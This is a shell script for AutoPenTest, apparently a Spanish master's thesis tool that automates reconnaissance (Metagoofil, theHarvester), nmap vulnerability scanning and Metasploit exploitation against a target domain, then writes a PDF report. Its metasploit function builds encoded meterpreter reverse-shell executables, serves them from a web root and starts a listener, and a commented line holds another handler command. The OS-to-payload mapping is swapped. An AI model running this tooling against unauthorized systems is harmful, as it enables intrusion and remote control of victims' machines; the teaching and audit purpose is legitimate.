#!/bin/sh

dir=$(pwd)
# Muestra el banner del programa 
_banner()
{
  case $1 in
    1)
      echo "     ********************************************************************"
      echo "     *                  _          ____          _________       _      *"
      echo "     *       /\        | |_       |     \       |___   ___|     | |_    *"
      echo "     *      /  \  _   _|  _| ___  |  H  |___  _ __  | | ___  ___|  _|   *"
      echo "     *     / /\ \| | | | |  /   \ |   _// _ \| '_ \ | |/ _ \/ __| |     *"
      echo "     *    / /  \ \ (_| | |_|  D  ||  | |  __/| | | || |  __/\__ \ |_    *"
      echo "     *    \/    \/\____|__| \___/ |__|  \___||_| |_||_|\___||___/___|   *"
      echo "     *                                                                  *"
      echo "     *                                                                  *"
      echo "     *  AutoPenTest  Versión 0.0.5                                      *"
      echo "     *  Codificado por D. Hervás Rodríguez                              *"
      echo "     *  dhervas18@alumno.uned.es                                        *"
      echo "     *                                                                  *"
      echo "     ********************************************************************"
    ;;
    *)
      echo "         ********************************************************************"
      echo "         *                  _          ____          _________       _      *"
      echo "         *       /\        | |_       |     \       |___   ___|     | |_    *"
      echo "         *      /  \  _   _|  _| ___  |  H  |___  _ __  | | ___  ___|  _|   *"
      echo "         *     / /\ \| | | | |  /   \ |   _// _ \| '_ \ | |/ _ \/ __| |     *"
      echo "         *    / /  \ \ (_| | |_|  D  ||  | |  __/| | | || |  __/\__ \ |_    *"
      echo "         *    \/    \/\____|__| \___/ |__|  \___||_| |_||_|\___||___/___|   *"
      echo "         *                                                                  *"
      echo "         *                                                                  *"
      echo "         *  AutoPenTest  Versión 0.0.5                                      *"
      echo "         *  Codificado por D. Hervás Rodríguez                              *"
      echo "         *  dhervas18@alumno.uned.es                                        *"
      echo "         *                                                                  *"
      echo "         ********************************************************************"
    ;;
  esac
}

# Muestra el menu general
_menu()
{
    _banner
    echo "##########"
    echo "DOMINIO: $dom"
    echo "##########"
    echo
    echo "Selecciona una opcion:"
    echo
    echo "1) Opcion 1: Asignar Dominio"
    echo "2) Opcion 2: Ejecución Metagoofil"
    echo "3) Opcion 3: Ejecución theHarvester"
    echo "4) Opcion 4: Ejecución nmap"
    echo "5) Opcion 5: Ejecución metasploit"
    echo "6) Opcion 6: Generación reporte"
    echo "97) Opcion 97: Inicializar BDD"
    echo "98) Opcion 98: Limpiar BDD"
    echo "99) Opcion 99: Debug"
    echo
    echo "9) Salir"
    echo
    echo -n "Indica una opcion: "
}
 
# Muestra la opcion seleccionada del menu
_mostrarResultado()
{

    #clear
    echo ""
    echo "------------------------------------"
    echo "Has seleccionado la opcion $1"
    echo "------------------------------------"
    #echo ""

    if [ "$1" -eq "1" ]; then
        read -p "Introduce el dominio: " dom
        echo ""
    fi

    if [ "$1" -eq "2" ]; then
      if [ -z "$dom" ]; then
        echo "El dominio no puede estar vacío!"
      else
        echo "Ejecución de Metagoofil"
        echo "------------------------------------"
        echo ""
        _metaGoofil $dom & bash spinner.sh $!
      fi
    fi 

    if [ "$1" -eq "3" ]; then
      if [ -z "$dom" ]; then
        echo "El dominio no puede estar vacío!"
      else
        echo "Ejecución de theHarvester"
        echo "------------------------------------"
        echo ""
        _theHarvester $dom & bash spinner.sh $!
      fi
    fi

    if [ "$1" -eq "4" ]; then
      if [ -z "$dom" ]; then
        echo "El dominio no puede estar vacío!"
      else
        echo "Ejecución de nmap"
        echo "------------------------------------"
        echo ""
        _nmap $dom & bash spinner.sh $!
      fi
    fi

    if [ "$1" -eq "5" ]; then
      if [ -z "$dom" ]; then
        echo "El dominio no puede estar vacío!"
      else
        echo "Ejecución de metasploit"
        echo "------------------------------------"
        echo ""
        _metasploit $dom #& bash spinner.sh $!
      fi
    fi

    if [ "$1" -eq "6" ]; then
        echo "Generación del reporte"
        echo "------------------------------------"
        echo ""
        _report $dom & bash spinner.sh $!
    fi

    if [ "$1" -eq "97" ]; then
      echo "Inicialización de la base de datos"
      echo "------------------------------------"
      _initBDD & bash spinner.sh $!
    fi   

    if [ "$1" -eq "98" ]; then
      echo "Limpia de la base de datos"
      echo "------------------------------------"
      _truncBDD & bash spinner.sh $!
    fi   

    if [ "$1" -eq "99" ]; then
     #setopt shwordsplit


      sqlite3 $dir/BDD.db 'DELETE FROM T_NMAP;'
      while read line; do
        flag=0
        aux=$(echo $line | cut -c1-1)
        if [ "$aux" -gt 0 ]; then

          puerto="$(echo $line | cut -d'/' -f1)"

          line=$(echo $line | cut -d'/' -f2 | sed 's/  */ /g')

          flag=1

          puertoBD=$(echo "'""$puerto""'")
          for part in $line; do
            partBD=$(echo "'""$part""'")
            sqlite3 $dir/BDD.db <<END_SQL
            INSERT INTO T_NMAP(PUERTO,INFO) VALUES ('$puerto','$part');
END_SQL

          done
        fi 2>/dev/null

        if [ $flag -eq 0 ]; then
          linea=$(echo $line | sed 's/^..//')
          linea=$(echo $linea | sed -nr 's/.*\[(.*)\].*/\1/p')
          linea=$(echo "https://vulners.com/cve/"$linea)

          sqlite3 $dir/BDD.db <<END_SQL
            INSERT INTO T_NMAP(PUERTO,INFO) VALUES ('$puerto','$linea');
END_SQL
        fi  2>/dev/null

      done <$dir/temp/nmapLog.txt 
      sqlite3 $dir/BDD.db 'SELECT * FROM T_NMAP';
    #xmllint --format $dir/temp/nmap_output.xml > $dir/temp/nmap_output.txt
    #sqlite3 $dir/BDD.db 'INSERT INTO T_NMAP(PUERTO,INFO) VALUES ("IP",'$line');'
    #cat $dir/temp/nmap_output.txt| tr -d "[:blank:]" > $dir/temp/nmap_output2.txt && mv $dir/temp/nmap_output2.txt $dir/temp/nmap_output.txt
    #sed -n -e '/^<port/p' $dir/temp/nmap_output.txt > $dir/temp/port.txt
    #nmap -sV --script=vulscan/vulscan.nse --script-args vulscandb=cve.csv www.example.com > $dir/temp/nmapLog.txt
    #sed "$(( $(wc -l <$dir/temp/nmapLog.txt)-2 )),$ d" $dir/temp/nmapLog.txt > $dir/temp/nmapMod.txt 
    #sed -e '1,6d' $dir/temp/nmapMod.txt > $dir/temp/nmapLog.txt
    #sed '/^|_/d' $dir/temp/nmapLog.txt > $dir/temp/nmapMod.txt
    #sed '/^| vulscan/d' $dir/temp/nmapMod.txt > $dir/temp/nmapLog.txt
    #sed -r '/^.{,3}$/d' $dir/temp/nmapLog.txt > $dir/temp/nmapMod.txt
    #sed '/closed/d' $dir/temp/nmapMod.txt > $dir/temp/nmapLog.txt
      #sleep 3 & bash spinner.sh $!
      #sudo service postgresql start || exit

      #msfconsole <<EOF
      #sleep 5
      #?
      #quit
#EOF
      #echo "Enter ip: "
      #read ip

      #echo "Enter port: "
      #read port

      #msfconsole -q -x " use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set lhost $ip; set lport $port ; exploit;"
      #var=999
      #sqlite3 $dir/BDD.db <<'END_SQL'
      #INSERT INTO TEST(CLAVE1, CLAVE2) VALUES ('$var',"TEST INSERCIÓN");
      #CREATE TABLE IF NOT EXISTS TEST2 AS SELECT * FROM TEST;
      #INSERT INTO TEST2 SELECT * FROM TEST;
      #DELETE FROM TEST;
      #SELECT * FROM TEST2;
      #sqlite3 $dir/BDD.db 'INSERT INTO TEST2(CLAVE1, CLAVE2) VALUES ('$var',"TEST INSERCIÓN");' 2>/dev/null
#END_SQL
    #sed -n -e '/^<email>/p' $dir/temp/theHarvest.txt > $dir/temp/email.txt

    #if [ -s $dir/temp/email.txt ]; then
      #echo "email.txt no está vacío"
      #sed -e 's!<email>!!' $dir/temp/email.txt > $dir/temp/email2.txt && mv $dir/temp/email2.txt $dir/temp/email.txt
      #sed -e 's!</email>!!' $dir/temp/email.txt > $dir/temp/email2.txt && mv $dir/temp/email2.txt $dir/temp/email.txt
      #sed -i '/^$/d' $dir/temp/email.txt
      
      #while read p; do
        #line=$(echo "'""$p""'")
        #sqlite3 $dir/BDD.db 'INSERT INTO T_THEHARVEST(TIPO,DOCUMENTO) VALUES ("EMAIL",'$line');'
      #done <$dir/temp/email.txt
    #fi

    fi 

}

_mostrarError()
{
  echo ""
  echo "--------------------------------------"
  echo "Has seleccionado una opción incorrecta"
  echo "--------------------------------------"
  echo ""
}

_metaGoofil(){
  domain=$1

  if [ ! -d "$dir/temp" ]; then
    mkdir $dir/temp
  fi

  if [ -f $dir/temp/metaGoofLog.txt ]; then
    rm $dir/temp/metaGoofLog.txt
  fi

  metagoofil -d $domain -t pdf,doc,xls,docx,xlsx -o $dir/temp -f $dir/temp/metaGoof.html > $dir/temp/metaGoofLog.txt

  if [ $? -ne 0 ]; then
    echo "Error en la ejecución de Metagoofil"
  else
    echo "Ficheros .pdf del dominio $domain recuperados en $dir/temp"
    echo "Guardando información en la base de datos. Tabla: T_METAGOOF"
    sqlite3 $dir/BDD.db 'DELETE FROM T_METAGOOF;'
      while read p; do
        line=$(echo "'""$p""'")
        sqlite3 $dir/BDD.db 'INSERT INTO T_METAGOOF(DOCUMENTO) VALUES ('$line');'
      done <$dir/temp/metaGoof.html

  fi
}

_theHarvester(){
  domain=$1

  if [ ! -d "$dir/temp" ]; then
    mkdir $dir/temp
  fi

  if [ -f $dir/temp/theHarvestLog.txt ]; then
    rm $dir/temp/theHarvestLog.txt
  fi

  theHarvester -d $domain -b all -f $dir/temp/theHarvest.xml > $dir/temp/theHarvestLog.txt

  if [ $? -ne 0 ]; then
    echo "Error en la ejecución de theHarvester"
  else
    echo "Resultados de la ejecución de theHarvester sobre $domain recuperados en $dir/temp"

    xmllint --format $dir/temp/theHarvest.xml > $dir/temp/theHarvest.txt
    cat $dir/temp/theHarvest.txt| tr -d "[:blank:]" > $dir/temp/theHarvest2.txt && mv $dir/temp/theHarvest2.txt $dir/temp/theHarvest.txt
    sed '/^<\//d' $dir/temp/theHarvest.txt > $dir/temp/theHarvest2.txt && mv $dir/temp/theHarvest2.txt $dir/temp/theHarvest.txt
    sed -n -e '/^<host>/p' $dir/temp/theHarvest.txt > $dir/temp/hosts.txt

    if [ -s $dir/temp/hosts.txt ]; then
      #echo "hosts.txt no está vacío"
      sed -e 's!<host>!!' $dir/temp/hosts.txt > $dir/temp/hosts2.txt && mv $dir/temp/hosts2.txt $dir/temp/hosts.txt
      sed -e 's!</host>!!' $dir/temp/hosts.txt > $dir/temp/hosts2.txt && mv $dir/temp/hosts2.txt $dir/temp/hosts.txt
      sed -i '/^$/d' $dir/temp/hosts.txt
      sqlite3 $dir/BDD.db 'DELETE FROM T_THEHARVEST;'
      while read p; do
        line=$(echo "'""$p""'")
        sqlite3 $dir/BDD.db 'INSERT INTO T_THEHARVEST(TIPO,DOCUMENTO) VALUES ("HOST",'$line');'
      done <$dir/temp/hosts.txt
    fi


    sed -n -e '/^<hostname>/p' $dir/temp/theHarvest.txt > $dir/temp/hostname.txt
    
    if [ -s $dir/temp/hostname.txt ]; then
      #echo "hostname.txt no está vacío"
      sed -e 's!<hostname>!!' $dir/temp/hostname.txt > $dir/temp/hostname2.txt && mv $dir/temp/hostname2.txt $dir/temp/hostname.txt
      sed -e 's!</hostname>!!' $dir/temp/hostname.txt > $dir/temp/hostname2.txt && mv $dir/temp/hostname2.txt $dir/temp/hostname.txt
      sed -i '/^$/d' $dir/temp/hostname.txt
      
      while read p; do
        line=$(echo "'""$p""'")
        sqlite3 $dir/BDD.db 'INSERT INTO T_THEHARVEST(TIPO,DOCUMENTO) VALUES ("HOSTNAME",'$line');'
      done <$dir/temp/hostname.txt
    fi


    sed -n -e '/^<email>/p' $dir/temp/theHarvest.txt > $dir/temp/email.txt

    if [ -s $dir/temp/email.txt ]; then
      #echo "email.txt no está vacío"
      sed -e 's!<email>!!' $dir/temp/email.txt > $dir/temp/email2.txt && mv $dir/temp/email2.txt $dir/temp/email.txt
      sed -e 's!</email>!!' $dir/temp/email.txt > $dir/temp/email2.txt && mv $dir/temp/email2.txt $dir/temp/email.txt
      sed -i '/^$/d' $dir/temp/email.txt
      
      while read p; do
        line=$(echo "'""$p""'")
        sqlite3 $dir/BDD.db 'INSERT INTO T_THEHARVEST(TIPO,DOCUMENTO) VALUES ("EMAIL",'$line');'
      done <$dir/temp/email.txt
    fi


    sed -n -e '/^<ip>/p' $dir/temp/theHarvest.txt > $dir/temp/ip.txt

    if [ -s $dir/temp/ip.txt ]; then
      #echo "ip.txt no está vacío"
      sed -e 's!<ip>!!' $dir/temp/ip.txt > $dir/temp/ip2.txt && mv $dir/temp/ip2.txt $dir/temp/ip.txt
      sed -e 's!</ip>!!' $dir/temp/ip.txt > $dir/temp/ip2.txt && mv $dir/temp/ip2.txt $dir/temp/ip.txt
      sed -i '/^$/d' $dir/temp/ip.txt
      
      while read p; do
        line=$(echo "'""$p""'")
        sqlite3 $dir/BDD.db 'INSERT INTO T_THEHARVEST(TIPO,DOCUMENTO) VALUES ("IP",'$line');'
      done <$dir/temp/ip.txt
    fi
  fi
}

_nmap(){
  domain=$1
  
  if [ ! -d "$dir/temp" ]; then
    mkdir $dir/temp
  fi

  if [ -f $dir/temp/nmap_output.txt ]; then
    rm $dir/temp/nmap_output.txt
  fi

  nmap -sV --script=vulscan/vulscan.nse --script-args vulscandb=cve.csv $domain > $dir/temp/nmapLog.txt

  if [ $? -ne 0 ]; then
    echo "Error en la ejecución de nmap"
  else


    sed "$(( $(wc -l <$dir/temp/nmapLog.txt)-3 )),$ d" $dir/temp/nmapLog.txt > $dir/temp/nmapMod.txt 
    sed -e '1,6d' $dir/temp/nmapMod.txt > $dir/temp/nmapLog.txt
    sed '/^|_/d' $dir/temp/nmapLog.txt > $dir/temp/nmapMod.txt
    sed '/^| vulscan/d' $dir/temp/nmapMod.txt > $dir/temp/nmapLog.txt
    sed -r '/^.{,3}$/d' $dir/temp/nmapLog.txt > $dir/temp/nmapMod.txt
    sed '/closed/d' $dir/temp/nmapMod.txt > $dir/temp/nmapLog.txt


    sqlite3 $dir/BDD.db 'DELETE FROM T_NMAP;'
    while read line; do
      flag=0
      aux=$(echo $line | cut -c1-1)
      if [ "$aux" -gt 0 ]; then

        puerto="$(echo $line | cut -d'/' -f1)"

        line=$(echo $line | cut -d'/' -f2 | sed 's/  */ /g')

        flag=1

        puertoBD=$(echo "'""$puerto""'")
        for part in $line; do
          partBD=$(echo "'""$part""'")
          sqlite3 $dir/BDD.db <<END_SQL
          INSERT INTO T_NMAP(PUERTO,INFO) VALUES ('$puerto','$part');
END_SQL

        done
      fi 2>/dev/null

      if [ $flag -eq 0 ]; then
        linea=$(echo $line | sed 's/^..//')
        linea=$(echo $linea | sed -nr 's/.*\[(.*)\].*/\1/p')
        linea=$(echo "https://vulners.com/cve/"$linea)
        
        sqlite3 $dir/BDD.db <<END_SQL
          INSERT INTO T_NMAP(PUERTO,INFO) VALUES ('$puerto','$linea');
END_SQL
      fi  2>/dev/null

    done <$dir/temp/nmapLog.txt
    echo "Resultados de la ejecución de nmap sobre $domain recuperados en $dir/temp"
  fi
}

_metasploit(){
  ip=$(ifconfig eth0 | grep "inet " | awk '{print $2}') 
  port=22
  if grep -q "Windows" $dir/Reporte/nmap.txt; 
  then
    payload=linux/x64/meterpreter/reverse_tcp
    name=mtp_linux
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b "\x00" -e x86/shikata_ga_nai -f exe -o $dir/$name.exe 2>/dev/null
  elif grep -q "Linux" $dir/Reporte/nmap.txt;
  then
    payload=windows/meterpreter/reverse_tcp
    name=mtp_windows
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ip LPORT=$port -b "\x00" -e x86/shikata_ga_nai -f exe -o $dir/$name.exe 2>/dev/null
  fi
  
  file=$(ls $dir/$name.exe)

  echo "Payload generado "
  echo "Ejecutable creado:" $file

  echo "Copiando payload a /var/www/html "
  sudo cp $name.exe /var/www/html/
  echo "Copiado "
  echo "Url :"" ""http://"$ip"/"$name".exe"
  echo "use exploit/multi/handler
  set PAYLOAD" ""$payload"
  set LHOST" ""$ip"
  set LPORT" ""$port"
  set ExitOnSession false
  exploit -j -z
  sleep 5
  sessions
  exit -y" | tee listenerw.rc

  echo "Arrancamos MetasploitFramework multi/handler" 
  msfconsole -q -r listenerw.rc > $dir/Reporte/msf.txt

  #sed -e 's/\x1b\[[0-9;]*m//g' $dir/Reporte/msf.txt > $dir/Reporte/msf2.txt
  #mv $dir/Reporte/msf2.txt $dir/Reporte/msf.txt
  sed -i 's/\x1b\[[0-9;]*m//g' $dir/Reporte/msf.txt
  sed -i 's/\\/\//g' $dir/Reporte/msf.txt


  filebreak=$(sed -n '/^Active/{=;q;}' $dir/Reporte/msf.txt)
  filebreak=$((filebreak-1))

  split -l $filebreak $dir/Reporte/msf.txt segment

  sed -i '/^\[/!d' $dir/Reporte/segmentaa
  sed -i 's/$/  /' $dir/Reporte/segmentaa
  echo '\n' >> $dir/Reporte/segmentaa
  sed -i 's/([^()]*)//g' $dir/Reporte/segmentab
  sed -i 's/\=/\-/g' $dir/Reporte/segmentab

  cat $dir/Reporte/segmentaa $dir/Reporte/segmentab > $dir/Reporte/msf.txt

  rm $dir/Reporte/segmenta*
}

_report(){
  domain=$1
  _repPortada $domain
  _repManifiesto

  _repMetagoofil
  _repHarvester
  _repNMAP
  _repMetasploit

  _repAutorizacion
  _repConfidencialidad

  pandoc $dir/Reporte/Reporte.md -o $dir/Reporte/Reporte.pdf
}

_repPortada(){
  domain=$1
  dia=$(date "+%d")
  mes=$(date "+%m")
  anyo=$(date "+%Y")

  case $mes in
    01)
      mes="Enero"
      ;;
    02)
      mes="Febrero"
      ;;
    03)
      mes="Marzo"
      ;;
    04)
      mes="Abril"
      ;;
    05)
      mes="Mayo"
      ;;
    06)
      mes="Junio"
      ;;
    07)
      mes="Julio"
      ;;
    08)
      mes="Agosto"
      ;;
    09)
      mes="Septiembre"
      ;;
    10)
      mes="Octubre"
      ;;
    11)
      mes="Noviembre"
      ;;
    12)
      mes="Diciembre"
      ;;
esac

fechaRep=$(echo $mes" "$dia", "$anyo)

if [ ! -d "$dir/Reporte" ]; then
  mkdir $dir/Reporte
fi

echo "---" > $dir/Reporte/Reporte.md
echo "title: Informe sobre el dominio "$domain >> $dir/Reporte/Reporte.md
echo "author: David Hervás Rodríguez" >> $dir/Reporte/Reporte.md
echo "date: "$fechaRep >> $dir/Reporte/Reporte.md
echo "header-includes:" >> $dir/Reporte/Reporte.md
echo "  - \usepackage{multirow, xltabular, geometry}" >> $dir/Reporte/Reporte.md
echo "output:" >> $dir/Reporte/Reporte.md
echo "    pdf_document" >> $dir/Reporte/Reporte.md
echo "geometry: margin=2cm" >> $dir/Reporte/Reporte.md
echo "---" >> $dir/Reporte/Reporte.md
echo "![]($dir/temp/LogoUNED.jpg)" >> $dir/Reporte/Reporte.md
printf '%s' '\newpage' >> $dir/Reporte/Reporte.md

}

_repManifiesto(){
echo "\n\n# Manifiesto" >> $dir/Reporte/Reporte.md
echo "\n" >> $dir/Reporte/Reporte.md
_banner 1 >> $dir/Reporte/Reporte.md
echo "\n" >> $dir/Reporte/Reporte.md
echo "El objetivo de este trabajo final de máster es el análisis, diseño y desarrollo de la aplicación AutoPenTest que permite la automatización de las etapas de auditorías
técnicas de seguridad o pentesting hasta la explotación. La aplicación recibe como entrada el dominio objetivo del análisis. Mediante técnicas de auditoría activas y/o pasivas, 
y con el uso de herramientas de pentesting, se implementan de manera automática las primeras tres etapas del proceso de pentesting.\n" >> $dir/Reporte/Reporte.md
echo "El objetivo de este informe, diseñado como conclusión de la aplicación AutoPenTest es mostrar la infraestructura descubierta así como las vulnerabilidades detectadas 
incluyendo la información recogida a lo largo de todo el proceso.\n" >> $dir/Reporte/Reporte.md
printf '%s' '\vfill' >> $dir/Reporte/Reporte.md
echo "\n# Referencias" >> $dir/Reporte/Reporte.md
echo "\n" >> $dir/Reporte/Reporte.md
echo "[Etapa 1 - Reconocimiento] theHarvester, https://github.com/laramies/theHarvester \n" >> $dir/Reporte/Reporte.md
echo "[Etapa 1 - Reconocimiento] metagoofil, http://www.edge-security.com/metagoofil.php \n" >> $dir/Reporte/Reporte.md
echo "[Etapa 2 - Descubrimiento] NMAP, https://insecure.org/ \n" >> $dir/Reporte/Reporte.md
echo "[Etapa 3 - Explotación] metasploit, https://metasploit.com/ \n" >> $dir/Reporte/Reporte.md
printf '%s' '\newpage' >> $dir/Reporte/Reporte.md
}

_repMetagoofil(){

  sqlite3 $dir/BDD.db "SELECT * FROM T_METAGOOF where DOCUMENTO like '%ing.es%';" > $dir/Reporte/metagoofil.txt
  nblignesMETA=$(wc -l < $dir/Reporte/metagoofil.txt)

  if [ ! "$nblignesMETA" -eq "0" ]; then
    echo "\n\n# Etapa 1: Reconocimiento - metagoofil" >> $dir/Reporte/Reporte.md

    printf '%s' '\begin{xltabular}{\textwidth}{|X|}' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{metagoofil}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfirsthead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{metagoofil}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endhead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|r|}{{Continua en la siguiente página}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfoot' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endlastfoot' >> $dir/Reporte/Reporte.md

    while IFS= read -r line
    do

      linea=$(echo "$line" | sed -r 's/[_]+/\\_/g')
      printf '%s' '\url{'$linea'} \\' >> $dir/Reporte/Reporte.md


    done <$dir/Reporte/metagoofil.txt






    printf '%s' '\end{xltabular}' >> $dir/Reporte/Reporte.md
  fi

  printf '%s' '\newpage' >> $dir/Reporte/Reporte.md
}

_repHarvester(){

  echo "\n\n# Etapa 1: Reconocimiento - theHarvester" >> $dir/Reporte/Reporte.md
  sqlite3 $dir/BDD.db "select DOCUMENTO from T_THEHARVEST WHERE TIPO='HOST' LIMIT 100;" > $dir/Reporte/theHarvHost.txt
  #sed -e 's!HOST|!!' $dir/Reporte/theHarvHost.txt > $dir/Reporte/theHarvHost2.txt && 
  sqlite3 $dir/BDD.db "select DOCUMENTO from T_THEHARVEST WHERE TIPO='HOSTNAME' LIMIT 100;" > $dir/Reporte/theHarvHostname.txt
  sqlite3 $dir/BDD.db "select DOCUMENTO from T_THEHARVEST WHERE TIPO='IP' LIMIT 100;" > $dir/Reporte/theHarvIp.txt
  sqlite3 $dir/BDD.db "select DOCUMENTO from T_THEHARVEST WHERE TIPO='EMAIL' LIMIT 100;" > $dir/Reporte/theHarvEmail.txt

  nblignesHost=$(wc -l < $dir/Reporte/theHarvHost.txt)
  nblignesHostname=$(wc -l < $dir/Reporte/theHarvHostname.txt)
  nblignesIp=$(wc -l < $dir/Reporte/theHarvIp.txt)
  nblignesEmail=$(wc -l < $dir/Reporte/theHarvEmail.txt)

  ##########HOST############
  if [ ! "$nblignesHost" -eq "0" ]; then
    printf '%s' '\begin{xltabular}{\textwidth}{|X|}' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{Hosts}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfirsthead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{Hosts}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endhead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|r|}{{Continua en la siguiente página}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfoot' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endlastfoot' >> $dir/Reporte/Reporte.md

    while IFS= read -r line
    do
      linea=$(echo "$line" | sed -r 's/[_]+/\\_/g')
      printf '%s' '\url{'$linea'} \\' >> $dir/Reporte/Reporte.md
    done <$dir/Reporte/theHarvHost.txt

    printf '%s' '\end{xltabular}' >> $dir/Reporte/Reporte.md

  fi
  
  ##########HOSTNAMES############
  if [ ! "$nblignesHostname" -eq "0" ]; then
    printf '%s' '\begin{xltabular}{\textwidth}{|X|}' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{Hostnames}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfirsthead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{Hostnames}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endhead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|r|}{{Continua en la siguiente página}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfoot' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endlastfoot' >> $dir/Reporte/Reporte.md

    while IFS= read -r line
    do
      linea=$(echo "$line" | sed -r 's/[_]+/\\_/g')
      printf '%s' '\url{'$linea'} \\' >> $dir/Reporte/Reporte.md
    done <$dir/Reporte/theHarvHostname.txt

    printf '%s' '\end{xltabular}' >> $dir/Reporte/Reporte.md

  fi
  
  ##########IP############
  if [ ! "$nblignesIp" -eq "0" ]; then
    printf '%s' '\begin{xltabular}{\textwidth}{|X|}' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{IPs}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfirsthead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{IPs}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endhead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|r|}{{Continua en la siguiente página}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfoot' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endlastfoot' >> $dir/Reporte/Reporte.md

    while IFS= read -r line
    do
      linea=$(echo "$line" | sed -r 's/[_]+/\\_/g')
      printf '%s' '\url{'$linea'} \\' >> $dir/Reporte/Reporte.md
    done <$dir/Reporte/theHarvIp.txt

    printf '%s' '\end{xltabular}' >> $dir/Reporte/Reporte.md
  fi

  ##########EMAIL############
  if [ ! "$nblignesEmail" -eq "0" ]; then
    printf '%s' '\begin{xltabular}{\textwidth}{|X|}' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{Email}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfirsthead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{Email}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endhead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|r|}{{Continua en la siguiente página}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfoot' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endlastfoot' >> $dir/Reporte/Reporte.md

    while IFS= read -r line
    do
      linea=$(echo "$line" | sed -r 's/[_]+/\\_/g')
      printf '%s' '\url{'$linea'} \\' >> $dir/Reporte/Reporte.md
    done <$dir/Reporte/theHarvEmail.txt

    printf '%s' '\end{xltabular}' >> $dir/Reporte/Reporte.md
  fi
    printf '%s' '\newpage' >> $dir/Reporte/Reporte.md
}

_repNMAP(){

  sqlite3 $dir/BDD.db "select * from T_NMAP LIMIT 60;" > $dir/Reporte/nmap.txt
  nblignesNMAP=$(wc -l < $dir/Reporte/nmap.txt)

  if [ ! "$nblignesNMAP" -eq "0" ]; then
    echo "\n\n# Etapa 2: Descubrimiento - NMAP" >> $dir/Reporte/Reporte.md

    printf '%s' '\begin{xltabular}{\textwidth}{|l|X|}' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{Puerto}} & \multicolumn{1}{c|}{\textbf{Información}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfirsthead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{1}{|c|}{\textbf{Puerto}} & \multicolumn{1}{c|}{\textbf{Información}} \\ \hline' >> $dir/Reporte/Reporte.md 
    printf '%s' '\endhead' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline \multicolumn{2}{|r|}{{Continua en la siguiente página}} \\ \hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endfoot' >> $dir/Reporte/Reporte.md

    printf '%s' '\hline' >> $dir/Reporte/Reporte.md
    printf '%s' '\endlastfoot' >> $dir/Reporte/Reporte.md

    puerto=0
    hlinea=0
    while IFS='|' read -r param1 param2
    do

      aux=$(echo $param1"|")
      aux=$(grep -o $aux $dir/Reporte/nmap.txt | wc -l)

      if [ ! "$puerto" -eq "$param1" ]; then
        if [ "$hlinea" -eq "1" ]; then
          printf '%s' '\hline' >> $dir/Reporte/Reporte.md 
        fi
        hlinea=1
        printf '%s' '\multirow{'$aux'}{4em}{'$param1'} & '$param2' \\' >> $dir/Reporte/Reporte.md 
      else
        printf '%s' '& '$param2' \\' >> $dir/Reporte/Reporte.md
      fi

      puerto=$param1
    done <$dir/Reporte/nmap.txt

    printf '%s' '\end{xltabular}' >> $dir/Reporte/Reporte.md

  fi
  #printf '%s' '\newpage' >> $dir/Reporte/Reporte.md
}

_repMetasploit(){
  if [ -f $dir/Reporte/msf.txt ]; then
    echo "\n\n# Etapa 3: Explotación - Metasploit" >> $dir/Reporte/Reporte.md
    printf '%s' '\begin{xltabular}{\textwidth}{|X|}' >> $dir/Reporte/Reporte.md

